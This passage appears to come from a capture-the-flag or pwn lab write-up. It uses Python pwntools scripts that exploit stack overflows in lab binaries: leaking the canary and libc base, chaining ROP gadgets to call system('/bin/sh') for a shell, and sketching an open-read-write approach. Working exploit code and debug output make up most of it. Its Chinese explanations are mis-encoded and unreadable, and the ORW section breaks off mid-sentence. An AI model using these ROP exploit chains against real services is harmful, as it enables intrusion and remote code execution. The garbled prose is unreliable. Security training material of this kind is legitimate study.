</span></span><span class=line><span class=cl><span class=n>main_return_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>received</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;waitwhat? &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>main_return_addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>__libc_start_main_addr</span> <span class=o>=</span> <span class=n>main_return_addr</span> <span class=o>+</span> <span class=mh>0x30</span> 
</span></span><span class=line><span class=cl><span class=n>libc_addr</span> <span class=o>=</span> <span class=n>__libc_start_main_addr</span> <span class=o>-</span> <span class=n>__libc_start_main_offset</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;main_return_addr:      </span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>main_return_addr</span><span class=p>))</span> 
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;__libc_start_main_addr:</span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>__libc_start_main_addr</span><span class=p>))</span> 
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;libc_addr:             </span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>libc_addr</span><span class=p>))</span> 
</span></span></code></pre></td></tr></table></div></div><p>è¿è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p><pre>[<font color=#C01C28><b>DEBUG</b></font>] Sent 0x118 bytes:
    b&apos;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBCCDDEEFFGGHH&apos;
[<font color=#C01C28><b>DEBUG</b></font>] Received 0x126 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  â”‚AAAA<font color=#12488B>â”‚</font>AAAA<font color=#12488B>â”‚</font>AAAA<font color=#12488B>â”‚</font>AAAAâ”‚
    *
    00000100  41 41 41 41  41 41 41 41  41 41 42 42  43 43 44 44  â”‚AAAA<font color=#12488B>â”‚</font>AAAA<font color=#12488B>â”‚</font>AABB<font color=#12488B>â”‚</font>CCDDâ”‚
    00000110  45 45 46 46  47 47 48 48  <font color=#12488B>90</font> <font color=#12488B>9d</font> <font color=#12488B>c2</font> 42  38 77 <font color=#C01C28>0a</font> 69  â”‚EEFF<font color=#12488B>â”‚</font>GGHH<font color=#12488B>â”‚Â·Â·Â·</font>B<font color=#12488B>â”‚</font>8w<font color=#C01C28>Â·</font>iâ”‚
    00000120  6e 70 75 74  3e 20                                  â”‚nput<font color=#12488B>â”‚</font>&gt; â”‚
    00000126
b&apos;\x90\x9d\xc2B8w\x00\x00&apos;
[<font color=#12488B><b>*</b></font>] waitwhat? 0x773842c29d90
[<font color=#12488B><b>*</b></font>] main_return_addr:      0000773842C29D90
[<font color=#12488B><b>*</b></font>] __libc_start_main_addr:0000773842C29DC0
[<font color=#12488B><b>*</b></font>] libc_addr:             0000773842C00000
</pre><p>å¾—åˆ° libc çš„åœ°å€ä¸º <code>0x0000773842C00000</code></p><h3 id=getting-system-shell>Getting system shell</h3><p>å·²ç»çŸ¥é“äº† libc çš„åœ°å€ï¼Œé‚£å°±ä» libc é‡Œé¢æ‰¾ gadgetï¼š<code>ROPgadget --binary ./libc.so.6 --only "pop|ret"</code></p><p>éœ€è¦æ‰¾ä¸€ä¸ª rdi_ret ä¸ä¸€ä¸ªå•ç‹¬çš„ ret ï¼Œä½†æ˜¯å•ç‹¬çš„ ret ç©ºè½¬çš„åŸå› ï¼Œä¸Šç½‘è¯´æ˜¯å› ä¸º<strong>ubuntu18åŠä»¥ä¸Š</strong>åœ¨<strong>è°ƒç”¨systemå‡½æ•°çš„æ—¶å€™ä¼šå…ˆè¿›è¡Œä¸€ä¸ªæ£€æµ‹</strong>ï¼Œå¦‚æœæ­¤æ—¶çš„<strong>æ ˆæ²¡æœ‰16å­—èŠ‚å¯¹é½çš„è¯</strong>ï¼Œå°±ä¼š<strong>å¼ºè¡ŒæŠŠç¨‹åºcrashæ‰</strong>ï¼Œæ‰€ä»¥éœ€è¦<strong>æ ˆå¯¹é½</strong> ï¼Œä½†æˆ‘å¹¶æ²¡æœ‰çœ‹æ‡‚ã€‚æ— è®ºå¦‚ä½•ï¼Œåœ¨ libc é‡Œé¢æ‰¾åˆ°äº†è¿™æ ·ä¸¤ä¸ª gadgetsï¼š</p><pre>0x000000000002a3e5 : pop rdi ; ret
0x0000000000029139 : ret</pre><p>ç„¶ååƒä¸‹é¢è¿™æ ·æ„é€  payload ï¼Œå°±å¯ä»¥ç›´æ¥è·å– shell äº†ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Getting system shell</span>
</span></span><span class=line><span class=cl><span class=n>ret_addr</span> <span class=o>=</span> <span class=mh>0x0000000000029139</span> <span class=o>+</span> <span class=n>libc_addr</span>
</span></span><span class=line><span class=cl><span class=n>rdi_rtn_addr</span> <span class=o>=</span> <span class=mh>0x000000000002a3e5</span> <span class=o>+</span> <span class=n>libc_addr</span>
</span></span><span class=line><span class=cl><span class=n>system_addr</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=n>libc_addr</span> <span class=c1>#systemå‡½æ•°çš„åœ°å€</span>
</span></span><span class=line><span class=cl><span class=n>bin_sh_addr</span> <span class=o>=</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=s1>&#39;/bin/sh&#39;</span><span class=p>))</span> <span class=o>+</span> <span class=n>libc_addr</span> <span class=c1>#â€˜/bin/shâ€™çš„åœ°å€</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>offset</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>Canary</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;AABBCCDD&#39;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdi_rtn_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>bin_sh_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>system_addr</span><span class=p>)</span> 
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;system_addr:</span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>system_addr</span><span class=p>))</span> 
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;bin_sh_addr:</span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>bin_sh_addr</span><span class=p>))</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># pause()</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x110</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x110</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>è¿è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src=https://s2.loli.net/2024/07/29/RmdVi6tZyqKMfT2.png loading=lazy alt=image-20240727002154799.png></p><p>æˆåŠŸè·å¾— flag ä¸º <code>AAA{oh_R0P_1s_b4b@b4b@s1c~}</code></p><h3 id=approach-2-orw>Approach 2 ORW</h3><p>ORW å³ <code>open(file, olfag)</code> <code>read(fd, buf, n_bytes)</code> ä¸ <code>write(fd, buf, n_bytes)</code> ã€‚</p><p>æ‰€ä»¥è¦ç”¨ rdi å¯¹åº”æ–‡ä»¶åœ°å€ <code>file</code> ç”¨äº openï¼Œ å¯¹åº” <code>fd</code> é¡¹ç”¨äº read ä¸ writeï¼šåœ¨ORWä¸­ï¼Œæˆ‘ä»¬éœ€è¦è®¾ç½® read çš„ <code>fd</code> ä¸º 3ï¼Œè¡¨ç¤ºä»æ–‡ä»¶ä¸­è¯»å–ï¼Œwriteçš„ <code>fd</code> è¿˜æ˜¯å¦‚å¸¸ï¼Œä¾æ—§ä¸º 1 ï¼›</p><p>ç”¨ rsi å¯¹åº” <code>oflag</code> ç”¨äº open ï¼ˆç”±äºåªç”¨è¯»å–å°±è¡Œäº†æ‰€ä»¥å– 0 ï¼‰ï¼Œå¯¹åº” <code>buf</code> ç”¨äº read ä¸ writeï¼›</p><p>æœ€åç”¨ rdx å¯¹åº” <code>n_bytes</code> ç”¨äº read ä¸ write ã€‚</p><p>æˆ‘ä»¬å…ˆå‰å·²ç»æ‰¾åˆ°äº† <code>pop_rdi_ret</code> çš„ gadgetäº†ï¼Œæ¥ç€æ‰¾ rsi ä¸ rdx çš„ ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0x000000000011f2e7 : pop rdx ; pop r12 ; ret
</span></span><span class=line><span class=cl>0x000000000002be51 : pop rsi ; ret
</span></span></code></pre></td></tr></table></div></div><p>æ‰€ä»¥å¯¹äºè°ƒç”¨ <code>open(rdi -> "./flags.txt", rsi -> 0)</code> ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ ˆå†™æˆè¿™ä¸ªæ ·å­ï¼š</p><div class=table-wrapper><table><thead><tr><th><code>pop_rdi_ret_addr</code></th><th><code>"./flags.txt"</code></th><th><code>pop_rsi_ret</code></th><th>0x00000000</th><th><code>open_addr</code></th></tr></thead></table></div><p>å¯¹äºè°ƒç”¨ <code>read(rdi -> 3, rsi -> oflag)</code> ï¼Œ</p><h2 id=task2-onerop>Task2 onerop</h2><p>æœ¬é¢˜ç›®çš„å®Œæ•´ä»£ç ä¸º attachment ä¸­çš„ <code>pwnlab2_task2_code.py</code></p><h3 id=preparation--leaking-libc-addr>Preparation & Leaking libc addr</h3><p><code>checksec</code> ä¸€ä¸‹ï¼Œæ²¡æœ‰å¼€ PIE ä¸ Canaryï¼Œæ„Ÿè§‰æ¯”ç¬¬ä¸€é¢˜å‹å¥½å¤šäº†ï¼Œç”¨ IDA ç¼–è¯‘å‡ºæ¥çš„ <code>main()</code> ä¹Ÿæ˜¯ååˆ†ç®€å•ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__fastcall</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>__int64</span> <span class=n>buf</span><span class=p>[</span><span class=mi>32</span><span class=p>];</span> <span class=c1>// [rsp+0h] [rbp-100h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>initbuf</span><span class=p>(</span><span class=n>argc</span><span class=p>,</span> <span class=n>argv</span><span class=p>,</span> <span class=n>envp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mh>0x1000uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>((</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><code>0x100</code> é•¿çš„å†…å­˜å´ç»™äº† <code>0x1000</code> çš„è¯»å…¥ï¼Œå¦¥å¦¥çš„æ ˆæº¢å‡ºã€‚</p><p>ç”¨ ROPgadget ä¸€çœ‹ï¼Œç”šè‡³é¢˜ç›®æœ¬èº«å°±æœ‰ä¸€äº›å¥½ç”¨çš„ gadgetï¼š</p><pre>0x00000000004011c5 : pop rdi ; ret
0x000000000040101a : ret
0x0000000000401181 : retf</pre><p>å†è€…ï¼Œç”¨ <code>seccomp-tools dump</code> æŸ¥çœ‹ï¼Œå‘ç°ç¨‹åºæ²¡æœ‰å¼€å¯æ²™ç®±ï¼Œå¯ä»¥è€ƒè™‘ get shell äº†ã€‚ç°åœ¨è¦åšçš„å°±æ˜¯æ³„æ¼ libc åŸºå€ï¼Œç„¶åä½¿ç”¨ libc çš„ <code>system(/bin/sh)</code> è·å– shell æ§åˆ¶æƒã€‚</p><p>åŒæ—¶ï¼Œä½¿ç”¨ gdb åŠ¨æ€è°ƒè¯•ï¼Œåœ¨ Backtrace æ ä¸­å‘ç°</p><pre><font color=#12488B>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</font>
 â–º 0         0x40131a main+336
   1   0x7ffff7c2a1ca __libc_start_call_main+122
   2   0x7ffff7c2a28b __libc_start_main+139
   3         0x4010b5 _start+37
</pre><p>æ‰€ä»¥ä¸€å¼€å§‹çš„æ€è·¯ï¼Œå°±æ˜¯åˆ©ç”¨æ ˆæº¢å‡ºè®© <code>puts()</code> å‡½æ•°è¾“å‡º <code>main()</code> çš„è¿”å›åœ°å€ï¼ˆå…³äº <code>__libc_start_call_main</code> çš„åç§»åœ°å€æ˜¯ +122ï¼‰ï¼Œè€Œ <code>__libc_start_call_main</code> ç›¸å¯¹äº <code>__libc_start_main</code> çš„åç§»åœ°å€æ˜¯ -0xB0 ï¼Œå¯ä»¥å› æ­¤æ±‚å‡º <code>__libc_start_main</code> çš„å®é™…åœ°å€ï¼Œç„¶åæ±‚å¾— libc çš„åœ°å€ã€‚ä½†æ˜¯ç”±äºæ²¡æœ‰å¾ªç¯ï¼Œä¸”æ­£å¸¸æµç¨‹åªèƒ½è¿›è¡Œä¸€æ¬¡è¾“å…¥ï¼Œæ‰€ä»¥é¦–æ¬¡è¾“å…¥ï¼ˆå°šä¸çŸ¥é“ libc åœ°å€ï¼‰å°±è¦æ„é€  ROP é“¾ä½¿å¾— <code>main()</code> è¿”å›åˆ°å®ƒè‡ªèº«ï¼Œç„¶ååœ¨ç¬¬äºŒæ¬¡è¾“å…¥ï¼ˆæ­¤æ—¶å·²ç»çŸ¥é“ libc åœ°å€ï¼‰æ„é€  ROP é“¾ä»¥è·å– shell æ§åˆ¶æƒã€‚</p><p>çœ‹èµ·æ¥å¾ˆå¥½ï¼Œä½†æ˜¯å¤±è´¥äº†â€”â€”æœ€åç¨‹åºæ²¡æœ‰åƒè®¾æƒ³çš„æ‰“å¼€ shellï¼Œè€Œæ˜¯æŠ¥æ®µé”™è¯¯é€€å‡ºã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ Debug åå‘ç°ï¼Œæˆ‘ä»¬åœ¨ç¬¬ä¸€æ¬¡è¾“å…¥æ—¶ä¸ºäº†è®© <code>main()</code> è¿”å›åˆ°å®ƒè‡ªèº«ï¼Œè‚¯å®šè¦æŠŠåŸæ¥ <code>main()</code> çš„è¿”å›åœ°å€è¦†ç›–æ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨ <code>puts()</code> å‡½æ•°è¾“å‡ºçš„ï¼Œå…¶å®æ˜¯ <code>main()</code> çš„åœ°å€ï¼Œè€Œä¸æ˜¯<code>__libc_start_call_main + 122</code> ï¼Œè¿™ä¸ªæ€è·¯é”™äº†ã€‚</p><p>æ—¢ç„¶ä¸èƒ½æ³„æ¼ <code>main()</code> åŸæ¥çš„è¿”å›åœ°å€ï¼Œé‚£å°±æ³„æ¼ <code>main()</code> è°ƒç”¨è¿‡çš„å‡½æ•°ã€‚çœ‹äº†ä¸€å †ä½œé¢˜ç¬”è®°åï¼Œå‘ç° <code>puts()</code> æ¯”è¾ƒå¥½å¼„ï¼š</p><p>æˆ‘ä»¬ç¬¬ä¸€æ¬¡è¾“å…¥å‰ï¼Œå…ˆæ±‚ <code>puts()</code> çš„ plt ä¸ got åœ°å€ï¼ˆå› ä¸º glibc çš„å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼‰ï¼Œç„¶åé€šè¿‡ç¬¬ä¸€æ¬¡è¾“å…¥æŠŠæ ˆè¦†å†™æˆè¿™ä¸ªå½¢å¼ï¼š</p><div class=table-wrapper><table><thead><tr><th><code>pop_rdi_ret_addr</code></th><th><code>puts_got</code></th><th><code>puts_plt</code></th><th><code>main_addr</code></th></tr></thead></table></div><p>è¿™æ ·ï¼Œæˆ‘ä»¬åœ¨ç¬¬ä¸€æ¬¡è¾“å‡ºåï¼Œ<code>main()</code> å‡½æ•° return ï¼ˆæ‰§è¡Œç¬¬ä¸€ä¸ª <code>ret</code> æ—¶ <code>rbp</code> æŒ‡å‘ <code>pop_rdi_ret_addr</code> ï¼‰åˆ° <code>pop rdi; ret;</code> çš„ gadgetï¼Œ å°±å¯ä»¥å°† <code>puts()</code> çš„å®é™…åœ°å€ï¼ˆåœ¨ GOT è¡¨å†…ï¼Œæ‰€ä»¥æ˜¯ <code>puts_got</code> ï¼‰ä½œä¸ºå‚æ•°ä¼ ç»™ rdi ï¼Œç„¶åå†æ¬¡ return ï¼ˆæ‰§è¡Œç¬¬äºŒä¸ª <code>ret</code> æ—¶ <code>rbp</code> æŒ‡å‘ <code>puts_plt</code> ï¼‰åˆ° <code>puts()</code> å‡½æ•°ä»è€Œè¾“å‡ºå®ƒè‡ªå·±çš„å®é™…åœ°å€ï¼Œç„¶åå† return åˆ° <code>main()</code> å‡½æ•°ã€‚æˆ‘ä»¬å°±å¯ä»¥ç”¨ <code>puts()</code> å‡½æ•°çš„åœ°å€æ±‚ libc çš„åœ°å€äº†ã€‚</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Step one Leaking puts() address &amp; return to main() again</span>
</span></span><span class=line><span class=cl><span class=n>main_addr</span> <span class=o>=</span> <span class=mh>0x00000000004011CA</span>
</span></span><span class=line><span class=cl><span class=n>ret_addr</span> <span class=o>=</span> <span class=mh>0x000000000040101a</span>
</span></span><span class=line><span class=cl><span class=n>rdi_ret_addr</span> <span class=o>=</span> <span class=mh>0x00000000004011c5</span>   
</span></span><span class=line><span class=cl><span class=n>puts_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>puts_got</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>puts_offsets</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>offset</span> <span class=o>=</span> <span class=mh>0x100</span> <span class=o>+</span> <span class=mh>0x8</span>
</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=n>offset</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdi_ret_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>puts_got</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>puts_plt</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>main_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># pause()</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># conn.interactive();</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span> <span class=c1>#first puts()</span>
</span></span><span class=line><span class=cl><span class=n>received1</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span> <span class=c1>#second puts() outputs its addr</span>
</span></span><span class=line><span class=cl><span class=n>received1</span> <span class=o>=</span> <span class=n>received1</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>received1</span> <span class=o>=</span> <span class=n>received1</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\0</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>puts_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>received1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_addr</span> <span class=o>=</span> <span class=n>puts_addr</span> <span class=o>-</span> <span class=n>puts_offsets</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;puts_addr =&gt; &#34;</span><span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>puts_addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;libc_addr =&gt; 0x</span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>libc_addr</span><span class=p>))</span> 
</span></span></code></pre></td></tr></table></div></div><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src=https://s2.loli.net/2024/07/29/N7zCeuRF8pivmtY.png loading=lazy alt=image-20240727205306318.png></p><p>å¯ä»¥çœ‹åˆ°è·å–çš„ libc åœ°å€ä¸º <code>0x00007F6506C9D000</code></p><h3 id=getting-system-shell-1>Getting system shell</h3><p>æœ€åï¼ŒæŒ‰å¦‚ä¸‹æ„é€  payload ï¼Œå¯ä»¥è·å– shellï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Step two Getting system shell</span>
</span></span><span class=line><span class=cl><span class=n>system_addr</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=n>libc_addr</span> <span class=c1>#systemå‡½æ•°çš„åœ°å€</span>
</span></span><span class=line><span class=cl><span class=n>bin_sh_addr</span> <span class=o>=</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=s1>&#39;/bin/sh&#39;</span><span class=p>))</span> <span class=o>+</span> <span class=n>libc_addr</span> <span class=c1>#â€˜/bin/shâ€™çš„åœ°å€</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;bin_sh_addr =&gt; </span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>bin_sh_addr</span><span class=p>))</span> 
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;system_addr =&gt; </span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>system_addr</span><span class=p>))</span> 
</span></span><span class=line><span class=cl><span class=n>payload2</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=n>offset</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdi_ret_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>bin_sh_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>system_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># pause()</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
